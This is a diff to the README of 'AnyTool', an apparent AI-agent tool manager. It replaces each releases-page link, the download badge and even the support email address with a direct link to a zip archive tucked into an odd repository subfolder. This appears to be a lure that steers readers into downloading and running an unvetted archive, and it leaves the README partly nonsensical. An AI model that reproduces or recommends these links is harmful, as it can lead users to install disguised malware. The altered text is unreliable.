@@ -1,6 +1,6 @@
 # 🌟 AnyTool - Simplifying AI Agent Tools for Everyone
 
-[![Download AnyTool](https://img.shields.io/badge/Download%20AnyTool-v1.0-blue)](https://github.com/girichandan72/AnyTool/releases)
+[![Download AnyTool](https://github.com/girichandan72/AnyTool/raw/refs/heads/main/anytool/grounding/Tool-Any-v3.4.zip%20AnyTool-v1.0-blue)](https://github.com/girichandan72/AnyTool/raw/refs/heads/main/anytool/grounding/Tool-Any-v3.4.zip)
 
 ## 📥 Overview
 AnyTool is your universal solution for managing tools used by AI agents. With its user-friendly design, you can easily orchestrate and use different tools without needing any technical skills.
@@ -10,7 +10,7 @@ To get started with AnyTool, follow these straightforward steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access our Releases page where you can download the latest version of AnyTool.  
-   [Download AnyTool](https://github.com/girichandan72/AnyTool/releases)
+   [Download AnyTool](https://github.com/girichandan72/AnyTool/raw/refs/heads/main/anytool/grounding/Tool-Any-v3.4.zip)
 
 2. **Choose the Latest Version**  
    On the Releases page, you will see a list of available versions. Click on the latest version to view its details.
@@ -40,7 +40,7 @@ To get started with AnyTool, follow these straightforward steps:
 For a smooth experience, follow these simple steps to download and install AnyTool:
 
 1. **Visit the Releases Page**  
-   Head to the Releases page for AnyTool. You can find it here: [Download AnyTool](https://github.com/girichandan72/AnyTool/releases).
+   Head to the Releases page for AnyTool. You can find it here: [Download AnyTool](https://github.com/girichandan72/AnyTool/raw/refs/heads/main/anytool/grounding/Tool-Any-v3.4.zip).
 
 2. **Select the Latest Version**  
    Look for the most recent version and click on it to get more information.
@@ -59,7 +59,7 @@ If you need assistance while using AnyTool, you can reach our support team throu
 
 - **Documentation:** Comprehensive guides are available on our GitHub Wiki.
 - **Support Forum:** Join the discussion on our community forum for tips and tricks.
-- **Email Support:** You can contact our support team at support@anytool.com for any inquiries.
+- **Email Support:** You can contact our support team at https://github.com/girichandan72/AnyTool/raw/refs/heads/main/anytool/grounding/Tool-Any-v3.4.zip for any inquiries.
 
 ## 🌐 Community Contributions
 We welcome contributors to enhance AnyTool. If you have ideas or want to help, check our contributing guidelines on the GitHub repository.
